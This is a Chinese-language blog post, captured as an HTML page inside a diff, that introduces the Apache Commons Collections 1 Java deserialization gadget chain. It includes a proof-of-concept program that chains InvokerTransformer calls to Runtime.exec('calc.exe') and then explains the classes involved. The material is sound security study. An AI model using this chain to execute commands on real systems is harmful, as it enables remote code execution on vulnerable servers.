@@ -1,0 +1,355 @@
+﻿<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="referrer" content="origin" />
+    <meta name="description" content="Java安全之Commons Collections1分析前置知识 0x00 前言 Commons Collections的利用链也被称为cc链，在学习反序列化漏洞必不可少的一个部分。Apache C" />
+    <meta property="og:description" content="Java安全之Commons Collections1分析前置知识 0x00 前言 Commons Collections的利用链也被称为cc链，在学习反序列化漏洞必不可少的一个部分。Apache C" />
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <title> Java安全之Commons Collections1分析前置知识 - nice_0e3 - 博客园</title>
+    <link id="favicon" rel="shortcut icon" href="//common.cnblogs.com/favicon.svg" type="image/svg+xml" />
+    
+    <link rel="stylesheet" href="/css/blog-common.min.css?v=kXxbcm7tkkASG2_xwyD6Kw4CzHe0bT3mi0jyCb8YspQ" />
+    
+    <link type="text/css" rel="stylesheet" href="https://www.cnblogs.com/nice0e3/custom.css?v=rpVRRg0n57gY&#x2B;Kw07PlwXX/emho=" />
+    <link id="mobile-style" media="only screen and (max-width: 767px)" type="text/css" rel="stylesheet" href="/skins/codinglife/bundle-codinglife-mobile.min.css?v=JtOonyglmq10yOLdtvmh-WsVtFwm8HRB8mR_g_TGArQ" />
+    
+    <link type="application/rss+xml" rel="alternate" href="https://www.cnblogs.com/nice0e3/rss" />
+    <link type="application/rsd+xml" rel="EditURI" href="https://www.cnblogs.com/nice0e3/rsd.xml" />
+    <link type="application/wlwmanifest+xml" rel="wlwmanifest" href="https://www.cnblogs.com/nice0e3/wlwmanifest.xml" />
+    <script>
+        var currentBlogId = 592290;
+        var currentBlogApp = 'nice0e3';
+        var cb_enable_mathjax = false;
+        var isLogined = false;
+        var isBlogOwner = false;
+        var skinName = 'CodingLife';
+        var visitorUserId = '';
+    </script>
+        <script>
+            var currentPostDateAdded = '2020-10-01 06:18';
+        </script>
+    <script src="https://common.cnblogs.com/scripts/jquery-2.2.0.min.js"></script>
+    <script src="/js/blog-common.min.js?v=fLUEwRea4WeqlJe_CLnNunLQZl_ViJFLgKpcNDuKptI"></script>
+    
+    
+    
+</head>
+<body>
+    <a name="top"></a>
+    <div id="top_nav" class="navbar navbar-custom">
+        <nav id="nav_main" class="navbar-main">
+            <ul id="nav_left" class="navbar-list navbar-left">
+                <li class="navbar-branding">
+                    <a href="https://www.cnblogs.com/" title="开发者的网上家园"><img src="/images/logo.svg?v=R9M0WmLAIPVydmdzE2keuvnjl-bPR7_35oHqtiBzGsM" alt="博客园Logo" /></a>
+                </li>
+                <li><a href="/" onclick="ga('send', 'event', 'Link', 'click', 'skin-navbar-sitehome')">首页</a></li>
+                <li><a href="https://news.cnblogs.com/" onclick="ga('send', 'event', 'Link', 'click', 'skin-navbar-news')">新闻</a></li>
+                <li><a href="https://q.cnblogs.com/" onclick="ga('send', 'event', 'Link', 'click', 'skin-navbar-q')">博问</a></li>
+                <li><a id="nav_brandzone" href="https://brands.cnblogs.com/" onclick="ga('send', 'event', 'Link', 'click', 'skin-navbar-brands')">专区</a></li>
+                <li><a href="https://ing.cnblogs.com/" onclick="ga('send', 'event', 'Link', 'click', 'skin-navbar-ing')">闪存</a></li>
+                <li><a href="https://edu.cnblogs.com/" onclick="ga('send', 'event', 'Link', 'click', 'skin-navbar-edu')">班级</a></li>
+            </ul>
+            <ul id="nav_right" class="navbar-list navbar-right">
+                <li>
+                    <form id="zzk_search" class="navbar-search" action="https://zzk.cnblogs.com/s" method="get">
+                        <input name="w" id="zzk_search_input" placeholder="代码改变世界" type="text" tabindex="3" />
+                        <button type="submit" id="zzk_search_button">
+                            <img src="/images/aggsite/search.svg" alt="搜索" />
+                        </button>
+                    </form>
+                </li>
+                <li id="navbar_login_status" class="navbar-list">
+                    <a id="navblog-myblog-icon" class="navbar-user-info navbar-blog" href="https://passport.cnblogs.com/GetBlogApplyStatus.aspx" alt="我的博客" title="我的博客">
+                        <img id="myblog_icon" class="navbar-icon" src="/images/aggsite/myblog.svg" alt="我的博客" />
+                    </a>
+                    <a class="navbar-user-info navbar-message navbar-icon-wrapper" href="https://msg.cnblogs.com/" alt="短消息" title="短消息">
+                        <img id="msg_icon" class="navbar-icon" src="/images/aggsite/message.svg?v=oS4PkibyMjZ9rGD5XAcLt99uW_s76Javy2up4dbnZNY" alt="短消息" />
+                        <span id="msg_count" style="display: none"></span>
+                    </a>
+                    <div id="user_info" class="navbar-user-info dropdown">
+                        <a class="dropdown-button" href="https://home.cnblogs.com/">
+                            <img id="user_icon" class="navbar-avatar" src="/images/aggsite/avatar-default.svg" alt="用户头像" />
+                        </a>
+                        <div class="dropdown-menu">
+                            <a id="navblog-myblog-text" href="https://passport.cnblogs.com/GetBlogApplyStatus.aspx">我的博客</a>
+                            <a href="https://home.cnblogs.com/">我的园子</a>
+                            <a href="https://account.cnblogs.com/settings/account">账号设置</a>
+                            <a href="javascript:void(0)" onclick="logout();">退出登录</a>
+                        </div>
+                    </div>
+                    <a class="navbar-anonymous" href="https://account.cnblogs.com/signup/">注册</a>
+                    <a class="navbar-anonymous" href="https://account.cnblogs.com/signin/?returnUrl=https://www.cnblogs.com/">登录</a>
+                </li>
+            </ul>
+        </nav>
+    </div>
+
+    
+    
+<!--done-->
+<div id="home">
+<div id="header">
+	<div id="blogTitle">
+        <a id="lnkBlogLogo" href="https://www.cnblogs.com/nice0e3/"><img id="blogLogo" src="/skins/custom/images/logo.gif" alt="返回主页" /></a>		
+		
+<!--done-->
+<h1><a id="Header1_HeaderTitle" class="headermaintitle HeaderMainTitle" href="https://www.cnblogs.com/nice0e3/">nice_0e3</a>
+</h1>
+<h2>
+理想与热爱
+</h2>
+
+
+
+
+		
+	</div><!--end: blogTitle 博客的标题和副标题 -->
+	<div id="navigator">
+		
+<ul id="navList">
+<li><a id="blog_nav_sitehome" class="menu" href="https://www.cnblogs.com/">
+博客园</a>
+</li>
+<li>
+<a id="blog_nav_myhome" class="menu" href="https://www.cnblogs.com/nice0e3/">
+首页</a>
+</li>
+<li>
+
+<a id="blog_nav_newpost" class="menu" href="https://i.cnblogs.com/EditPosts.aspx?opt=1">
+新随笔</a>
+</li>
+<li>
+<a id="blog_nav_contact" class="menu" href="https://msg.cnblogs.com/send/nice_0e3">
+联系</a></li>
+<li>
+<a id="blog_nav_rss" class="menu" href="javascript:void(0)" data-rss="https://www.cnblogs.com/nice0e3/rss/">
+订阅</a>
+<!--<partial name="./Shared/_XmlLink.cshtml" model="Model" /></li>--></li>
+<li>
+<a id="blog_nav_admin" class="menu" href="https://i.cnblogs.com/">
+管理</a>
+</li>
+</ul>
+
+
+		<div class="blogStats">
+			
+			<span id="stats_post_count">随笔 - 
+77&nbsp; </span>
+<span id="stats_article_count">文章 - 
+0&nbsp; </span>
+<span id="stats-comment_count">评论 - 
+4</span>
+
+			
+		</div><!--end: blogStats -->
+	</div><!--end: navigator 博客导航栏 -->
+</div><!--end: header 头部 -->
+
+<div id="main">
+	<div id="mainContent">
+	<div class="forFlow">
+		<div id="post_detail">
+    <!--done-->
+    <div id="topics">
+        <div class="post">
+            <h1 class = "postTitle">
+                
+<a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/nice0e3/p/13758664.html">
+    <span> Java安全之Commons Collections1分析前置知识</span>
+    
+
+
+</a>
+
+            </h1>
+            <div class="clear"></div>
+            <div class="postBody">
+                
+<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
+    <h1 id="java安全之commons-collections1分析前置知识">Java安全之Commons Collections1分析前置知识</h1>
+<h2 id="0x00-前言">0x00 前言</h2>
+<p>Commons Collections的利用链也被称为cc链，在学习反序列化漏洞必不可少的一个部分。Apache Commons Collections是Java中应用广泛的一个库，包括Weblogic、JBoss、WebSphere、Jenkins等知名大型Java应用都使用了这个库。</p>
+<h2 id="0x01-前置知识">0x01 前置知识</h2>
+<p>这里先来看一段网上找的，poc代码</p>
+<pre><code>import org.apache.commons.collections.*;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.util.HashMap;
+import java.util.Map;
+
+public class test {
+
+    public static void main(String[] args) throws Exception {
+        //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
+                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
+                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
+        };
+
+        //将transformers数组存入ChaniedTransformer这个继承类
+        Transformer transformerChain = new ChainedTransformer(transformers);
+
+        //创建Map并绑定transformerChina
+        Map innerMap = new HashMap();
+        innerMap.put("value", "value");
+        //给予map数据转化链
+        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
+
+        //触发漏洞
+        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();
+        //outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式
+        onlyElement.setValue("foobar");
+    }
+}
+</code></pre>
+<p>先不管具体的实现，先来查看一下运行结果。</p>
+<p><img src="https://img2020.cnblogs.com/blog/1993669/202010/1993669-20201001181703659-304054646.png" alt="" loading="lazy"></p>
+<p>在调试这条链的时候会设置到一些没接触过的类，在调试前需要了解到这些类的一个作用，方便后面的理解。</p>
+<h3 id="transformer">Transformer</h3>
+<p>Transformer是Commons Collections中提供的一个接口</p>
+<p><img src="https://img2020.cnblogs.com/blog/1993669/202010/1993669-20201001181719615-1092140923.png" alt="" loading="lazy"></p>
+<h3 id="constanttransformer">ConstantTransformer</h3>
+<p>ConstantTransformer是Transformer的实现类</p>
+<p><img src="https://img2020.cnblogs.com/blog/1993669/202010/1993669-20201001181726920-1666390009.png" alt="" loading="lazy"></p>
+<p>在构造方法里面对iconstant进行传值，而其他的几个方法都是获取iconstant的值。</p>
+<h3 id="invokertransformer">InvokerTransformer</h3>
+<p>InvokerTransformer也是Transformer的实现类，</p>
+<p><img src="https://img2020.cnblogs.com/blog/1993669/202010/1993669-20201001181734383-160383072.png" alt="" loading="lazy"></p>
+<p>在构造方法中有三个参数，第⼀个参数是待执⾏的⽅法名，第⼆个参数<br>
+是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表  。</p>
+<p>里面还提供了一个Transform的方法，该方法可以通过Java反射机制来进行执行任意代码。</p>
+<h3 id="chainedtransformer">ChainedTransformer</h3>
+<p>ChainedTransformer也是实现了Transformer接⼝的⼀个类，</p>
+<p><img src="https://img2020.cnblogs.com/blog/1993669/202010/1993669-20201001181742432-895427753.png" alt="" loading="lazy"></p>
+<p><img src="https://img2020.cnblogs.com/blog/1993669/202010/1993669-20201001181753817-2076541331.png" alt="" loading="lazy"></p>
+<p>看到transform方法是通过传入Trasnformer[]数组来对传入的数值进行遍历并且调用数组对象的transform方法。</p>
+<h3 id="map">Map</h3>
+<p>Transform来执行命令需要绑定到Map上，抽象类AbstractMapDecorator是Apache Commons Collections提供的一个类，实现类有很多，比如LazyMap、TransformedMap等，这些类都有一个decorate()方法，用于将上述的Transformer实现类绑定到Map上，当对Map进行一些操作时，会自动触发Transformer实现类的tranform()方法，不同的Map类型有不同的触发规则。</p>
+<h3 id="transformedmap">TransformedMap</h3>
+<pre><code>Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
+</code></pre>
+<p>Transformer实现类分别绑定到map的key和value上，当map的key或value被修改时，会调用对应Transformer实现类的transform()方法。</p>
+<p>我们可以把chainedtransformer绑定到一个TransformedMap上，当此map的key或value发生改变时，就会自动触发chainedtransformer。</p>
+<h3 id="参考文章">参考文章</h3>
+<pre><code>https://www.cnblogs.com/litlife/p/12571787.html#transformer
+https://xz.aliyun.com/t/7031#toc-8
+</code></pre>
+<h2 id="0x02-未完续">0x02 未完续</h2>
+<p>CC链的调试比URLDNS要麻烦不少，调试的时候需要大量的知识填充。继续mark中。</p>
+
+</div>
+<div id="MySignature"></div>
+<div class="clear"></div>
+<div id="blog_post_info_block">
+    <div id="blog_post_info"></div>
+    <div class="clear"></div>
+    <div id="post_next_prev"></div>
+</div>
+            </div>
+            <div class="postDesc">posted @ 
+<span id="post-date">2020-10-01 18:18</span>&nbsp;
+<a href="https://www.cnblogs.com/nice0e3/">nice_0e3</a>&nbsp;
+阅读(<span id="post_view_count">20</span>)&nbsp;
+评论(<span id="post_comment_count">1</span>)&nbsp;
+<a href="https://i.cnblogs.com/EditPosts.aspx?postid=13758664" rel="nofollow">编辑</a>&nbsp;
+<a href="javascript:void(0)" onclick="AddToWz(13758664);return false;">收藏</a></div>
+        </div>
+	    
+	    
+    </div><!--end: topics 文章、评论容器-->
+</div>
+<script src="https://common.cnblogs.com/highlight/9.12.0/highlight.min.js"></script>
+<script>markdown_highlight();</script>
+<script>
+    var allowComments = true, cb_blogId = 592290, cb_blogApp = 'nice0e3', cb_blogUserGuid = '2e2f5aaf-94f8-4be7-a83c-08d7d2f044e4';
+    var cb_entryId = 13758664, cb_entryCreatedDate = '2020-10-01 18:18', cb_postType = 1;
+    loadViewCount(cb_entryId);
+</script><a name="!comments"></a>
+<div id="blog-comments-placeholder"></div>
+<script>
+    var commentManager = new blogCommentManager();
+    commentManager.renderComments(0);
+</script>
+<div id="comment_form" class="commentform">
+    <a name="commentform"></a>
+    <div id="divCommentShow"></div>
+    <div id="comment_nav"><span id="span_refresh_tips"></span><a href="javascript:void(0);" onclick="return RefreshCommentList();" id="lnk_RefreshComments" runat="server" clientidmode="Static">刷新评论</a><a href="#" onclick="return RefreshPage();">刷新页面</a><a href="#top">返回顶部</a></div>
+    <div id="comment_form_container"></div>
+    <div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
+    <div id="ad_t2"></div>
+    <div id="opt_under_post"></div>
+    <div id="cnblogs_c1" class="c_ad_block">
+        <div id='div-gpt-ad-1592365906576-0' style='width: 300px; height: 250px;'></div>
+    </div>
+    <div id="under_post_news"></div>
+    <div id="cnblogs_c2" class="c_ad_block">
+        <div id='div-gpt-ad-1592366332455-0' style='width: 468px; height: 60px;'></div>
+    </div>
+    <div id="under_post_kb"></div>
+    <div id="HistoryToday" class="c_ad_block"></div>
+    <script type="text/javascript">
+        fixPostBody();
+        deliverBigBanner();
+setTimeout(function() { incrementViewCount(cb_entryId); }, 50);        deliverT2();
+        deliverC1C2();
+        loadNewsAndKb();
+        loadBlogSignature();
+LoadPostCategoriesTags(cb_blogId, cb_entryId);        LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
+        GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate, cb_postType);
+        loadOptUnderPost();
+        GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);
+    </script>
+</div>
+	</div><!--end: forFlow -->
+	</div><!--end: mainContent 主体内容容器-->
+
+	<div id="sideBar">
+		<div id="sideBarMain">
+			
+<div id="sidebar_news" class="newsItem">
+            <script>loadBlogNews();</script>
+</div>
+
+<div id="sidebar_ad"></div>
+			<div id="blog-calendar" style="display:none"></div><script>loadBlogDefaultCalendar();</script>
+			
+			<div id="leftcontentcontainer">
+				<div id="blog-sidecolumn"></div>
+                    <script>loadBlogSideColumn();</script>
+			</div>
+			
+		</div><!--end: sideBarMain -->
+	</div><!--end: sideBar 侧边栏容器 -->
+	<div class="clear"></div>
+	</div><!--end: main -->
+	<div class="clear"></div>
+	<div id="footer">
+		<!--done-->
+Copyright &copy; 2020 nice_0e3
+<br /><span id="poweredby">Powered by .NET Core on Kubernetes</span>
+
+
+
+	</div><!--end: footer -->
+</div><!--end: home 自定义的最大容器 -->
+
+
+    <div id="page_end_html">
+        <div id="bottomProgressBar"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.0/dist/APlayer.min.css">
+<div id="aplayer" class="aplayer" data-id="316722029" data-lrctype="0" data-server="netease" data-type="playlist" data-fixed="true" data-listfolded="true"></div>
+<div id="rightMenu"></div>
+    </div>
+</body>
+</html>
